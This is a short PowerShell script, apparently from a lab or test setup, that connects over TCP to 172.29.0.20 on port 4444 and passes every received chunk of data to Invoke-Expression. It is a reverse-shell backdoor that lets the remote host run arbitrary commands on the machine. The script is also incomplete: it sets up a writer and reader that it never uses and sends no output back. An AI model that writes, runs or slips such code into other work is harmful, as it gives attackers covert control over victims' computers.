$client = New-Object System.Net.Sockets.TcpClient
$client.Connect("172.29.0.20", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
while($true) {
    $bytes = New-Object Byte[] 1024
    $count = $stream.Read($bytes, 0, 1024)
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $count)
    Invoke-Expression $data
}
$writer.Close()
$reader.Close()
$client.Close()